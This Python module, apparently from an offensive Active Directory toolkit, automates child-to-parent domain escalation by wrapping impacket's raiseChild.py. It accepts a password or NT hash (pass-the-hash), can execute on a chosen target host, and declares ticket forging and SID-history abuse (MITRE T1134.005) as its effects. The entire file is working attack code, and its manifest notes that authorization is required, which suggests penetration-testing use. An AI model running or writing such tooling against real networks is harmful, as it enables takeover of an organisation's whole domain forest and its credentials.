"""raiseChild — escalation automática child→parent domain."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.raise_child.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["domain_escalation", "ticket_forging"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1134.005"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None) or getattr(args, "dc_ip", None)
    parent_domain = getattr(args, "parent_domain", None)

    print("[*] raiseChild: auto-escalate {} -> {}".format(cred.domain, parent_domain or "parent domain"))

    import subprocess
    import shutil
    raiser = shutil.which("raiseChild.py") or shutil.which("impacket-raiseChild")
    if not raiser:
        print("[!] raiseChild.py (impacket) not found")
        return 1

    cmd = [raiser]
    if cred.password:
        cmd += ["{}/{}:{}".format(cred.domain, cred.username, cred.password)]
    elif cred.nthash:
        cmd += ["-hashes", "{}:{}".format(cred.lmhash or "", cred.nthash),
                "{}/{}".format(cred.domain, cred.username)]
    if target:
        cmd += ["-target-exec", target]

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
